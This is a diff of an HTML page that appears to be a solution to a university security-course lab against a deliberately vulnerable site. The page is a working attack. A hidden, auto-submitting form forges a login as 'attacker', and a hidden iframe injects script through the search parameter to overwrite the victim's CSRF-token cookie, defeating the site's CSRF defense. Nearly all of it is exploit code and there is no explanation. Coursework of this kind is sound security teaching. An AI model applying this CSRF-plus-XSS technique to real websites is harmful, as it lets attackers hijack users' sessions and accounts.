@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html>
- <body onload="document.forms[0].submit()">
-   <iframe name="dummyframe" width="0" height="0" border="0" style="display: none;"></iframe>
-   <form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" target="dummyframe">
-   	 <input name="csrf_token" value="db9994e49b017c9840938ea7f3f673a9" type="hidden">
-     <input type="hidden" name="username" value="attacker"/>
-     <input type="hidden" name="password" value="l33th4x"/>
-     <input type="submit" style="display: none;" value="Statue of liberty -- Hacked"/>
-   </form>
- </body>
+	<head>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	</head>
+	<body onload="document.forms[0].submit()">
+		<iframe name="dummysaframe" width="0" height="0" border="0" style="display: none;" src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie=%27csrf_token=826484eab39076288f9fadf6ef7bccde%27%3C/script%3E"></iframe>
+		<form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" target="dummysaframe">
+			<input name="csrf_token" value="826484eab39076288f9fadf6ef7bccde" type="hidden">
+			<input type="hidden" name="username" value="attacker"/>
+			<input type="hidden" name="password" value="l33th4x"/>
+			<input type="submit" style="display: none;" value="Statue of liberty -- Hacked"/>
+		</form>
+	</body>
 </html>
